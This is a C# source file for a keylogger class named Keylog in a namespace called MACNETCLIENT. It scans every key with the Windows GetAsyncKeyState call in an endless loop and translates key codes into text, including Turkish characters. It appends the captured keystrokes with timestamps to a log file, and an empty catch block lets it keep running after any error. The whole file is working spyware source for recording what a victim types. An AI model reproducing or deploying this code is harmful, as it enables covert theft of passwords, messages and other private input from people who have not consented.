using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
namespace MACNETCLIENT
{
    class Keylog
    {
        public string log_locate;
        public int log_per_key, last_key;
        StreamWriter file_writer;
        string BUFFER;
        [DllImport("user32")]
        public static extern short GetAsyncKeyState(int vKey);
        public Keylog(string loc, int log_key)
        {
            log_locate = loc;
            this.log_per_key = log_key;
            if (!File.Exists(log_locate))
            {
                File.Create(log_locate);
            }
        }
        public string keyconverter(short key)
        {
            switch (key)
            {
                case 0x09:
                    return "[TAB]";
                case 0x0D:
                    return "[ENTER]";
                case 0x1B:
                    return "[ESC]";
                case 0x08:
                    return "[BACKSPACE]";
                case 0x12:
                    return "[ALT]";
                case 0x01:
                    return "[LCLICK]";
                case 0x02:
                    return "[RCLICK]";
                case 0x04:
                    return "[MBCLICK]";
                case 0x11:
                    return "[CTRL]";
                case 0x14:
                    return "[CAPS LOCK]";
                case 0x2C:
                    return "[PRNT SCREEN]";
                case 0x5B:
                    return "[LWinKEY]";
                case 0x5C:
                    return "[RWinKEY]";
                case 0x70:
                    return "[F1]";
                case 0x71:
                    return "[F2]";
                case 0x72:
                    return "[F3]";
                case 0x73:
                    return "[F4]";
                case 0x74:
                    return "[F5]";
                case 0x75:
                    return "[F6]";
                case 0x76:
                    return "[F7]";
                case 0x77:
                    return "[F8]";
                case 0x78:
                    return "[F9]";
                case 0x79:
                    return "[F10]";
                case 0x90:
                    return "[NUMLOCK]";
                case 0xA0:
                    return "[LSHIFT]";
                case 0xA1:
                    return "[RSHIFT]";
                case 0xA2:
                    return "[LCTRL]";
                case 0xA3:
                    return "[RCTRL]";
                case 0x2E:
                    return "[DEL]";
                case 0x2D:
                    return "[INSERT]";
                case 219:
                    return Convert.ToChar(286).ToString();
                case 186:
                    return Convert.ToChar(350).ToString();
                case 222:
                    return Convert.ToChar(304).ToString();
                case 221:
                    return Convert.ToChar(220).ToString();
                case 191:
                    return Convert.ToChar(214).ToString();
                case 220:
                    return Convert.ToChar(199).ToString();
                case 0x30:
                    return "0";
                case 0x31:
                    return "1";
                case 0x32:
                    return "2";
                case 0x33:
                    return "3";
                case 0x34:
                    return "4";
                case 0x35:
                    return "5";
                case 0x36:
                    return "6";
                case 0x37:
                    return "7";
                case 0x38:
                    return "8";
                case 0x39:
                    return "9";
                case 0x60:
                    return "0";
                case 0x61:
                    return "1";
                case 0x62:
                    return "2";
                case 0x63:
                    return "3";
                case 0x64:
                    return "4";
                case 0x65:
                    return "5";
                case 0x66:
                    return "6";
                case 0x67:
                    return "7";
                case 0x68:
                    return "8";
                case 0x69:
                    return "9";
                case 0x6A:
                    return "*";
                case 0x6B:
                    return "+";
                case 0x6C:
                    return "-";
                case 0x6F:
                    return "/";

            }
            return Convert.ToChar(key).ToString();
        }
        public void start()
        {
            while(true)
            {
                try
                {
                    while (true)
                    {
                        while (true)
                        {
                            for (short i = 0; i <= 255; i++)
                            {
                                if (GetAsyncKeyState(i) == -32767)
                                {
                                    BUFFER += keyconverter(i);
                                    last_key += 1;
                                }
                            }
                            if (last_key == log_per_key)
                            {
                                file_writer = File.AppendText(log_locate);
                                file_writer.WriteLine(DateTime.Now + "\t" + BUFFER);
                                file_writer.Flush();
                                file_writer.Close();
                                last_key = 0;
                                BUFFER = "";
                                break;
                                /* VERIYI KAYDET */
                            }
                        }
                    }
                }
                catch (Exception eee)
                {
                    continue;
                }
            }
        }
    }
}